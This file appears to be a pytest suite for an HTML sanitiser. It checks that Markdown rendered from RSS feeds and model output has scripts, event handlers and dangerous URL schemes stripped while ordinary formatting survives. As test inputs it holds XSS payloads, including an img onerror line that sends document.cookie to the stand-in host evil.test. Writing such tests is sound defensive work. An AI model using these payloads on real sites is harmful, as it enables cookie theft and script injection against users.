"""Tests for HTML sanitisation of rendered content.

Rendered content originates from RSS feeds and a language model, and
python-markdown passes raw HTML straight through. Anything that reaches a page —
articles, tips, and now coach answers — goes through the allowlist first.
"""

from __future__ import annotations

import pytest

from app.utils.text import markdown_to_html, sanitize_html


def render(markdown: str) -> str:
    return str(markdown_to_html(markdown))


# ----------------------------------------------------------------------
# Dangerous markup is removed
# ----------------------------------------------------------------------


def test_script_tags_and_their_contents_are_dropped() -> None:
    out = render("<script>alert('xss')</script>Safe text")

    assert "<script" not in out
    assert "alert" not in out, "the script body must not survive as visible text"
    assert "Safe text" in out


@pytest.mark.parametrize("tag", ["iframe", "object", "embed", "style"])
def test_other_executable_or_styling_tags_are_dropped(tag: str) -> None:
    out = render(f"<{tag}>payload</{tag}>after")

    assert f"<{tag}" not in out
    assert "payload" not in out
    assert "after" in out


def test_event_handlers_are_stripped() -> None:
    out = render('<img src="x" onerror="alert(1)">')

    assert "onerror" not in out
    assert "alert" not in out


def test_inline_handlers_on_allowed_tags_are_stripped() -> None:
    out = sanitize_html('<div onclick="steal()">text</div>')

    assert "onclick" not in out
    assert "<div>text</div>" == out


@pytest.mark.parametrize(
    "href",
    [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "  javascript:alert(1)",
        "java\tscript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox(1)",
    ],
)
def test_dangerous_url_schemes_are_removed(href: str) -> None:
    out = sanitize_html(f'<a href="{href}">click</a>')

    assert "javascript" not in out.lower()
    assert "vbscript" not in out.lower()
    assert "data:" not in out.lower()
    assert ">click</a>" in out


def test_unknown_attributes_are_dropped() -> None:
    out = sanitize_html('<p data-evil="1" class="x" id="y">text</p>')

    assert out == "<p>text</p>"


# ----------------------------------------------------------------------
# Legitimate content survives
# ----------------------------------------------------------------------


def test_ordinary_markdown_renders() -> None:
    out = render("# Title\n\nSome **bold** and *italic* text.\n\n- one\n- two")

    assert "<h1>Title</h1>" in out
    assert "<strong>bold</strong>" in out
    assert "<em>italic</em>" in out
    assert out.count("<li>") == 2


def test_safe_links_are_kept_and_hardened() -> None:
    out = render("[Study](https://example.com/study)")

    assert 'href="https://example.com/study"' in out
    # Third-party links must not get window.opener.
    assert "noopener" in out


@pytest.mark.parametrize("scheme", ["https://a.test", "http://a.test", "mailto:a@b.test"])
def test_allowed_schemes_survive(scheme: str) -> None:
    assert scheme in sanitize_html(f'<a href="{scheme}">x</a>')


def test_relative_links_survive() -> None:
    assert 'href="/articles"' in sanitize_html('<a href="/articles">x</a>')


def test_tables_from_the_extra_extension_survive() -> None:
    out = render("| a | b |\n| - | - |\n| 1 | 2 |")

    assert "<table>" in out
    assert "<td>1</td>" in out


def test_blockquotes_and_code_survive() -> None:
    out = render("> quoted\n\n`inline code`")

    assert "<blockquote>" in out
    assert "<code>inline code</code>" in out


def test_text_is_escaped_not_executed() -> None:
    out = sanitize_html("5 < 6 & 7 > 2")

    assert "&lt;" in out and "&amp;" in out


# ----------------------------------------------------------------------
# Structural robustness
# ----------------------------------------------------------------------


def test_unclosed_tags_are_closed() -> None:
    """Malformed model output must not break the surrounding page."""

    out = sanitize_html("<p><strong>text")

    assert out.endswith("</strong></p>")


def test_stray_closing_tags_are_ignored() -> None:
    assert sanitize_html("text</div></p>") == "text"


def test_empty_input_is_safe() -> None:
    assert sanitize_html("") == ""
    assert str(markdown_to_html(None)) == ""


def test_a_realistic_feed_injection_is_neutralised() -> None:
    """What a hostile feed item or hallucinated body could contain."""

    hostile = (
        "Normal opening paragraph.\n\n"
        '<img src=x onerror="fetch(\'https://evil.test?c=\'+document.cookie)">\n\n'
        "<script>document.location='https://evil.test'</script>\n\n"
        "Closing paragraph."
    )

    out = render(hostile)

    for fragment in ["onerror", "<script", "document.cookie", "document.location"]:
        assert fragment not in out
    assert "Normal opening paragraph." in out
    assert "Closing paragraph." in out
